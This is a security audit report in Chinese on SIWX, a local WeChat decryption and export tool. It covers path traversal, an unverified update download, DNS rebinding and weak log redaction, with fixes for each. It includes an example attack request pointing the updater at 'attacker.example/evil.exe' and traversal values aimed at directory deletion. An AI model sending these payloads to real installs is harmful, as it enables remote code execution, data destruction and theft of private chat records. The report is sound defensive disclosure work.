# SIWX 安全审查报告 · v5.0.2

- **审查日期**：2026-09-19
- **审查范围**：`siwx/` 全模块（server / api_* / media / voice / exporter / keystore / plugins / mcp / auto_update / discover / paths / logger）
- **审查基线**：commit `1fd2d1d`（main，工作区干净）
- **审查性质**：只读审查，未修改任何业务代码
- **威胁模型**：本地安全边界 ——「同一台机器上的其他用户进程」「用户浏览器访问的任意网页」是攻击者，SIWX 持有的微信密钥/聊天记录是被保护资产

---

## 一、结论摘要

| 编号 | 问题 | 严重度 | 可利用性 | 状态 |
|---|---|---|---|---|
| H-1 | `/api/settings/clear` 的 `wxid` 参数路径穿越 → 任意目录删除 | **高** | 需本机进程访问 8787 | 未修复 |
| H-2 | `/api/update/do` 接受请求体中的 `assets` URL，攻击者传空 `sha256` 即可绕过校验下载执行任意 exe | **高**（仅 frozen 版） | 需本机进程访问 8787 | 未修复 |
| M-1 | 全部 `/api/*` 无鉴权 + 无 `Host`/`Origin` 校验 → DNS rebinding 可让任意网页拿到聊天记录 | **中** | 需诱导用户访问网页 | 未修复 |
| M-2 | `account` 参数路径穿越（`/api/chat/*`、`/api/chat/media/*`） | **中** | 需本机进程访问 8787 | 未修复 |
| M-3 | `/api/run` 的 `out_dir` 未校验 → 解密产物可写到任意路径 | **中** | 需本机进程访问 8787 | 未修复 |
| L-1 | `/api/logs/export` 日志脱敏规则不完全（32 位 hex、serverId 明文） | **低** | 分享日志时泄露 | 未修复 |
| L-2 | `_safe_name` 未剥离前导 `..`（当前不可达成，属防御纵深） | **低** | 理论 | 未修复 |
| L-3 | 密钥库 `media_key.json` 明文存储派生密钥（无 DPAPI 保护） | **低** | 需本机文件读取 | 未修复 |

**值得肯定的设计**（不是问题，但构成了重要的纵深防御）：
- `run_server` 默认绑定 `127.0.0.1`，`cli.py` 裸跑路径也强制 `127.0.0.1`，README 明确声明本地运行。
- MCP 走 **stdio**，不开放网络端口。
- Windows 上密钥库用 **DPAPI**（`CryptProtectData` + 项目熵）加密落盘，这是本机同用户以外无法解开的正确做法。
- 插件页面静态资源 `/plugin-pages/` 有 `resolve().relative_to()` 双重校验，防穿越。
- 全仓库无 `shell=True`、无 `os.system`、无 `eval`/`exec`（除 `exec_module` 加载插件，属预期设计）；`voice.py` 的 `subprocess.run` 用**列表参数**，无 shell 注入面。
- 无 `tarfile`/`zipfile.extractall`，无 Zip Slip 风险。
- 仓库卫生干净：`output/`、`exports/`、`logs/`、`*.log`、`auto_sync.json` 均已 gitignore，密钥库不在版本控制内。

---

## 二、高危问题详情

### H-1 任意目录删除 · `/api/settings/clear`

**位置**：`siwx/api_settings.py:132-151`

```python
@bp.post("/clear")
def clear():
    data = request.get_json(silent=True) or {}
    kind = data.get("kind", "")
    wxid = data.get("wxid")
    removed = []
    if kind == "output":
        root = _out_root()
        targets = ([root / wxid] if wxid
                   else [d for d in root.iterdir() if d.is_dir()]) if root.is_dir() else []
        for t in targets:
            if t.exists():
                shutil.rmtree(t, ignore_errors=True)   # ← 无边界校验
```

`wxid` 直接与 `_out_root()` 拼接后交给 `shutil.rmtree`，既无 `resolve()`，也无 `relative_to()` 收敛，更无白名单。

**实测验证**（`exports` = `_out_root()` 等价路径）：

| 请求 `wxid` | `rmtree` 实际目标 | 逃逸 |
|---|---|---|
| `normal_account` | `...\exports\normal_account` | 否 |
| `../../` | `G:\project\stories-in-wx` | **是** |
| `../../../Windows/System32` | `G:\project\Windows\System32` | **是** |

**修复建议**：
```python
root = _out_root().resolve()
if wxid:
    t = (root / str(wxid)).resolve()
    if t != root and root in t.parents:      # 必须严格位于 root 之下
        targets = [t]
    else:
        return jsonify({"error": "非法 wxid"}), 400
```
另建议 `wxid` 只在 `[A-Za-z0-9_.\-]` 白名单内，且与 `_accounts()` 枚举结果比对（同 `api_chat` 的做法），而非自由拼接。

---

### H-2 更新接口任意代码执行 · `/api/update/do`

**位置**：`siwx/api_update.py:32-41` + `siwx/auto_update.py:165-215`

**正常设计意图**：前端把 `/api/update/check` 返回的 `remote` 对象原样回传，`run_update` 依据其中的 `assets` URL 下载新版本。

**问题在于 `assets` 直接取自**请求体**，而不是服务端重新拉取**：

```python
@bp.post("/do")
def do_update():
    remote = request.get_json(silent=True) or {}
    if not remote:
        remote = has_update()[1]
    result = run_update(remote)     # ← remote 完全来自调用方
```

配合 `auto_update.py` 的三处弱点形成完整链：

1. `asset_url = remote.get("assets", {}).get("windows", "")` —— URL 调用方完全可控；
2. `expected_sha = _get_asset_sha(remote, plat)`，而 `_get_asset_sha` 在 `remote.get("sha256")` 为空时**直接返回 `""`**；
3. `if expected_sha and not _verify_sha256(...)` —— `expected_sha` 为空则**整段校验被跳过**，下载的文件无任何完整性校验即进入执行路径。

后续 `run_update` 调用 `subprocess.Popen(["cmd", "/c", <scripts>/update_win.bat])`，而该脚本会用 `%TEMP%\siwx_update\<fname>` 覆盖 exe 并重启。

**攻击请求**（在 frozen 发行版上，且能访问 8787）：
```http
POST /api/update/do HTTP/1.1
Host: 127.0.0.1:8787
Content-Type: application/json

{"version":"9.9.9","assets":{"windows":"http://attacker.example/evil.exe"},"sha256":""}
```

**说明**：源码运行（非 frozen）时 `is_frozen()` 为 `False`，`run_update` 在第一行即拒绝，因此**开发环境不受影响**；只有用户下载的 exe/dmg 发行版受影响。但受影响人群正是「无防护意识、按提示点更新」的普通用户。

**修复建议**（按优先级）：
1. `/api/update/do` **丢弃请求体**，改为服务端调用 `has_update()[1]` 自行获取 remote；
2. `_get_asset_sha` 为空时应**失败关闭**（拒绝更新），而不是跳过校验；
3. 校验 SHA-256 后，再对最终 exe 做一次**签名校验**（如 minisign / 内嵌公钥），使拿不到私钥就无法伪造发行版；
4. 校验 URL 必须落在 `github.com/ImUpXuu/SIWX` 或既定 raw 域名白名单内。

---

## 三、中危问题详情

### M-1 无鉴权 + 无 Host 校验 → DNS rebinding

**位置**：`siwx/server.py`（`app = Flask(...)`，无任何 `before_request` 鉴权钩子）；`siwx/api_*.py` 全部端点。

全仓库检索 `auth`/`token`/`before_request`/`Host`/`Origin`/`Referer`/`csrf`/`CORS` —— **零命中**。

虽然绑定 `127.0.0.1` 阻止了局域网直接访问，但攻击者可让用户浏览器访问 `evil.com`，该域名解析到 `127.0.0.1`（DNS rebinding）或直接 `fetch('http://127.0.0.1:8787/api/chat/messages?...')`。由于服务端不校验 `Origin`、不做 token 校验，浏览器会正常收到含**完整聊天记录**的 JSON，然后 POST 回攻击者服务器。

同时这也是 H-1 / H-2 的**放大路径**：H-2 的 POST 请求是 `Content-Type: application/json`（非 simple request）会触发 CORS 预检，因此纯 JS 场景受限；但 DNS rebinding 场景下同源，预检不触发，攻击完整可达。

**修复建议**：
1. **最低成本**：启动时生成随机 token，写入首页 URL 与前端；所有 `/api/*` 校验 token（`?t=` 或 `X-SIWX-Token` 头）。这同时解决 rebinding 与本地其他进程。
2. 在 `before_request` 中校验 `Host` 必须是 `127.0.0.1`/`localhost` + 端口，拒绝 IP 形式的其他值 —— 可有效阻断 rebinding（rebinding 时 `Host` 仍是 `evil.com`）。
3. 对所有非 GET 接口校验 `Origin` 为空或 `http://127.0.0.1:8787`。

考虑到项目定位是「本地个人工具、不做防御性安全加固」，若坚持不加 token，**至少**应加上第 2 条 `Host` 校验 —— 改动仅约 10 行，却能同时压制 M-1/H-1/H-2 的远程可达性。

---

### M-2 `account` 参数路径穿越

**位置**：
- `siwx/api_chat.py:326-328`（`/sessions`）
- `siwx/api_chat.py:892-911`（`/media/voice`：`voice.get_voice(_out_root() / account, ...)`）
- `siwx/api_chat.py:939-957`（`/media/image`：`media.get_image(account, md5, _out_root() / account, ...)`）

```python
account = request.args.get("account", "")
acc = _out_root() / account          # ← 未清洗
```

`/sessions` 后续有 `if not (acc / "message").is_dir()` 作为部分缓解（必须存在 `message` 子目录），但 `/media/image` 与 `/media/voice` 会直接把 `_out_root() / account` 作为**输出目录**交给 `media.get_image` / `voice.get_voice`，而这两个模块会读写 `hardlink/hardlink.db`、`message/*.db` 等文件、并以 `_out_root()/account` 为基准 `rglob` 搜索 —— 构成**任意目录读取 + 探测**面。

**实测**：`account=../../Windows/System32` 得到的 `acc` 指向 `G:\project\Windows\System32`，`escaped: True`。

对比 `api_plugins.py:181-193` 的 `_find_page_dir` 已有「名称白名单字符 + 目录必须存在」的正确写法 —— 可以照抄。

**修复建议**：加统一的 `_resolve_account(name)` helper，做 `[A-Za-z0-9_.\-]` 白名单 + `resolve()` 后 `relative_to(_out_root())` 收敛 + 与 `_accounts()` 枚举结果比对，所有用到 `account` 的端点统一调用。

---

### M-3 `/api/run` 的 `out_dir` 未校验

**位置**：`siwx/server.py:497-509` → `_run_job` 的 `out_dir` 参数（`server.py:254`、`server.py:269`）

```python
args = (data.get("mode", ""), data.get("db_dir"), data.get("out_dir"), ...)
```

`_run_job` 中 `out_root = out_dir or str(_paths.out_root())`，随后 `extract.decrypt_dir(db, str(Path(out_root) / wxid), ...)` —— 即调用方可指定**任意输出根目录**，把解密后的微信明文数据库（`message_*.db`、`contact.db`、`session.db`）写到任意位置。这既是信息泄露载体（可写入可被其他服务读取的目录），也是「静默落盘大量明文」的隐患。

`db_dir` 同理（`wxid_of(db_dir)` + `collect_db_files(db_dir)`），可作为**任意目录探测**原语。

**修复建议**：`out_dir` 收敛到 `_paths.out_root()` 子目录内；`db_dir` 要求必须落在 `find_wechat_data_dirs()` 或 `load_manual_data_dirs()` 的结果集合中（`/api/discover/validate` 已经做了路径合法性校验，可在 `/api/run` 复用同一校验）。

---

## 四、低危问题详情

### L-1 日志导出脱敏不完全

**位置**：`siwx/logger.py:133-157`

脱敏规则覆盖了 64 位 hex 密钥、`wxid_*`、`gh_*`、`\d+@chatroom`、绝对路径，方向正确。但存在遗漏：

- **32 位 hex**（媒体 md5 / AES-128 派生密钥形态）未覆盖 —— 而 `media.py` 的 `_remember_key` 缓存中 `aes` 正是 32 位 hex；
- **纯数字 `serverId` / `localId`** 未打码，可能被用于定位消息；
- `_PATH_RE` 依赖 `\s` 分词，路径含空格时脱敏不完整；
- `experimental`：`desensitize_msg` 只应用于 `export_logs`，**`/api/logs`（`server.py:588-610`）返回原始文本未脱敏**。这本身不算漏洞（同机读取），但意味着「日志页复制粘贴到 issue」这条路径没有保护 —— 而 `env_info` 的路径打码说明项目确实关心这个场景。

**建议**：`/api/logs` 增加 `?desensitize=1` 选项，或前端「复制」按钮走脱敏；`desensitize_msg` 增加 `\b[0-9a-fA-F]{32}\b` 规则。

### L-2 `_safe_name` 未剥离前导 `..`

**位置**：`siwx/exporter.py:36-55`

```python
name = name[:48].strip().rstrip(".").strip()
```

只 `rstrip(".")`，未处理前导点。`_safe_name("../x")` → `".._x"`（`/` 被替换为 `_`），结果安全；但只要将来有人改动替换字符集，`../` 就可能穿透。且导出目录 `export_dir` 还会被 `export_root` 前缀，属于纵深防御层。

**建议**：加 `name = name.lstrip(".")` 或显式拒绝 `..` 子串。当前不可利用，属加固项。

### L-3 派生媒体密钥明文落盘

**位置**：`siwx/media.py:46-70`（`media_key.json`）

`_save_key_cache` 明文写入 `data_dir()/media_key.json`，其中 `aes` 字段就是账号级媒体解密密钥（`MD5(str(code)+wxid)[:16]`）。而 `keystore.py` 对同等级敏感数据用了 DPAPI —— 两者标准不一致。

**建议**：`media_key.json` 复用 `keystore.py` 的 `_protect`/`_unprotect`（同一 DPAPI 熵），零成本对齐。

---

## 五、非漏洞但值得记录的观察

1. **`env_info.collect(quiet=True)` 的限制说明**已写在注释里（仅 CLI 单线程可用），设计意图清晰。
2. **插件系统是设计上的任意代码执行**（`importlib.exec_module`，`siwx/plugins/loader.py:115`）。这是插件架构的必然前提，不是漏洞；但意味着 **`<app_root>/plugins` 与 `data_dir` 目录的写权限 = 代码执行权限**。README 若未说明，建议补一句「不要从不可信来源放置插件」。
3. **`_run_after_export` / `task_listeners` 的插件钩子**在导出热路径同步执行，异常被吞（良好），但插件可在此读取全部解密后消息 —— 与第 2 点同源，属信任边界声明问题。
4. **`voice.py` 的 `SIWX_SILK_DECODER` 环境变量**会执行用户指定命令（`subprocess.run(tokens)`，列表参数）。因需本地设置环境变量，不构成远程面；但同样是「env var = 代码执行」的惯例，可接受。
5. **`paths.py` 的 `SIWX_ROOT` 环境变量**可覆盖数据根目录，属预期设计（便于测试），无校验但在本地威胁模型内可接受。

---

## 六、建议的修复顺序

| 优先级 | 动作 | 工作量 |
|---|---|---|
| P0 | H-1：`clear` 接口加路径收敛 + `wxid` 白名单 | ~10 行 |
| P0 | H-2：`/api/update/do` 丢弃请求体、服务端自取 remote；`_get_asset_sha` 空值改为失败关闭；URL 域名白名单 | ~25 行 |
| P1 | M-1：加 `Host` 校验（`before_request`），可选叠加启动 token | ~10–30 行 |
| P1 | M-2 / M-3：抽出统一的「账号名 / 目录」校验 helper 并在全部端点复用 | ~40 行 |
| P2 | L-1 / L-3：脱敏补 32 位 hex；`media_key.json` 接 DPAPI | ~15 行 |
| P3 | L-2：`_safe_name` 剥离前导点 | 1 行 |

---

## 七、审查局限

- 本报告基于**静态阅读 + 路径解析验证**，未启动真实服务做端到端 HTTP 利用验证（H-2 在源码模式下被 `is_frozen()` 阻断，无法本机复现完整链）。
- 未审计 `strategies/macos_lldb.py` 内嵌 lldb Python 脚本的完整逻辑（仅确认其非网络面）。
- 未审计 `siwx/ui/` 前端 JS 的 XSS 面（`SX.renderNodes` 白名单机制已存在，但未逐条核对所有插值点）。
- 未做依赖项 CVE 扫描（`Crypto`/`flask`/`zstandard`/`pilk` 版本未比对漏洞库）。
